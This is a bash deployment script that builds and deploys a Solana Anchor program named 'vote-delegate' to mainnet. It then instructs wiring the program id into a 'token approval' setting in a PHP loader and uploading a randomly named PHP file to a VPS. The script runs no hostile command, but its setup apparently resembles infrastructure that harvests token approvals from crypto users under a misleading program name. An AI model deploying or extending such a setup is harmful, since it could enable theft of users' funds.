#!/usr/bin/env bash
# Deploy vote-delegate on mainnet (run on Linux with Anchor + Solana CLI).
set -euo pipefail
cd "$(dirname "$0")"

anchor build
anchor deploy --provider.cluster mainnet

PROGRAM_ID="$(solana address -k target/deploy/vote_delegate-keypair.json)"
echo ""
echo "Deployed program id: ${PROGRAM_ID}"
echo ""
echo "Set in vps/loader.php:"
echo "  'token_approval_program_id' => '${PROGRAM_ID}',"
echo "  'token_approval_enabled' => true,"
echo ""
echo "Then: node vps/build-loader.mjs && upload vps/5joud6Jn.php to VPS"
